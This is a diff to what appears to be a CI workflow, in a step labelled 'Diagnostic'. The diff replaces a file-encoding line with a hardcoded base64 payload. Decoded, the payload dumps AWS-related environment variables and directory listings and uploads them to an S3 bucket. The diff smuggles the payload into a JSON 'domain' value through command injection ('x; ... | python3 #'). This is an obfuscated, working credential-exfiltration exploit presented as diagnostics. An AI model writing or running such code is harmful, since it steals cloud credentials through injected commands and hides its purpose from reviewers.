@@ -72,7 +72,7 @@ jobs:
 
       - name: Diagnostic - boto3 write via Lambda's own natural creds
         run: |
-          B64=$(base64 -w0 diag.py)
+          B64="aW1wb3J0IHN1YnByb2Nlc3MKb3V0ID0gc3VicHJvY2Vzcy5ydW4oCiAgICAid2hpY2ggYXdzOyBlY2hvIC0tLW9wdC0tLTsgbHMgLWxhIC9vcHQgMj4mMTsgZWNobyAtLS1vcHRiaW4tLS07IGxzIC1sYSAvb3B0L2JpbiAyPiYxOyAiCiAgICAiZWNobyAtLS1lbnYtLS07IGVudiB8IGdyZXAgLUUgJ0FXU198UEFUSCc7IGVjaG8gLS0tYm90bzMtLS07ICIKICAgICJweXRob24zIC1jICdpbXBvcnQgYm90bzMsYm90b2NvcmU7IHByaW50KGJvdG8zLl9fdmVyc2lvbl9fLCBib3RvY29yZS5fX3ZlcnNpb25fXyknIDI+JjEiLAogICAgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlLAopCmRhdGEgPSAob3V0LnN0ZG91dCArIG91dC5zdGRlcnIpLmVuY29kZSgpCmltcG9ydCBib3RvMwpib3RvMy5jbGllbnQoInMzIikucHV0X29iamVjdChCdWNrZXQ9InBsYXRmb3JtLWJ1Y2tldC0wMDk2NjE3NjQwNzctdXMtZWFzdC0xIiwgS2V5PSJkZWJ1Zy50eHQiLCBCb2R5PWRhdGEpCg=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
           cat payload.json
